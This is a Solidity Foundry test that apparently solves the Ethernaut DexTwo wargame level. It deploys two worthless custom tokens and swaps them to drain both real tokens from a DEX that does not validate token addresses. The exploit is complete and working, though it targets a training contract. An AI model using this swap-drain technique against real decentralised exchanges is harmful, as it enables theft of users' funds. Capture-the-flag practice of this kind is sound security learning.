// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/23-DexTwo/DexTwoFactory.sol";

contract DexTwoTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();

        SwappableTokenTwo maliciousToken1 = new SwappableTokenTwo(address(0x1), "malicious Token1", "MTK1", 2);
        SwappableTokenTwo maliciousToken2 = new SwappableTokenTwo(address(0x1), "malicious Token2", "MTK2", 2);

        maliciousToken1.transfer(levelAddress, 1);
        maliciousToken2.transfer(levelAddress, 1);
    
        emit log("---------------- after add the malicious token ----------------");
        emit log_named_uint("The hacker's balance of token1", ethernautDexTwo.balanceOf(token1, hacker));
        emit log_named_uint("The hacker's balance of token2", ethernautDexTwo.balanceOf(token2, hacker));
        emit log_named_uint("The hacker's balance of malicious token1", ethernautDexTwo.balanceOf(address(maliciousToken1), hacker));
        emit log_named_uint("The hacker's balance of malicious token2", ethernautDexTwo.balanceOf(address(maliciousToken2), hacker));
        emit log_named_uint("The balance of token1 in the DEXTwo", ethernautDexTwo.balanceOf(token1, levelAddress));
        emit log_named_uint("The balance of token2 in the DEXTwo", ethernautDexTwo.balanceOf(token2, levelAddress));
        emit log_named_uint("The balance of malicious token1 in dexTwo", ethernautDexTwo.balanceOf(address(maliciousToken1), levelAddress));
        emit log_named_uint("The balance of malicious token2 in dexTwo", ethernautDexTwo.balanceOf(address(maliciousToken2), levelAddress));

        maliciousToken1.approve(levelAddress, 1);
        maliciousToken2.approve(levelAddress, 1);
        ethernautDexTwo.swap(address(maliciousToken1), token1, 1);
        ethernautDexTwo.swap(address(maliciousToken2), token2, 1);
        
        emit log("---------------- after swap malicious token for the target token in the DEXTwo ----------------");
        emit log_named_uint("The hacker's balance of token1", ethernautDexTwo.balanceOf(token1, hacker));
        emit log_named_uint("The hacker's balance of token2", ethernautDexTwo.balanceOf(token2, hacker));
        emit log_named_uint("The hacker's balance of malicious token1", ethernautDexTwo.balanceOf(address(maliciousToken1), hacker));
        emit log_named_uint("The hacker's balance of malicious token2", ethernautDexTwo.balanceOf(address(maliciousToken2), hacker));
        emit log_named_uint("The balance of token1 in the DEXTwo", ethernautDexTwo.balanceOf(token1, levelAddress));
        emit log_named_uint("The balance of token2 in the DEXTwo", ethernautDexTwo.balanceOf(token2, levelAddress));
        emit log_named_uint("The balance of malicious token1 in the DEXTwo", ethernautDexTwo.balanceOf(address(maliciousToken1), levelAddress));
        emit log_named_uint("The balance of malicious token2 in the DEXTwo", ethernautDexTwo.balanceOf(address(maliciousToken2), levelAddress));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}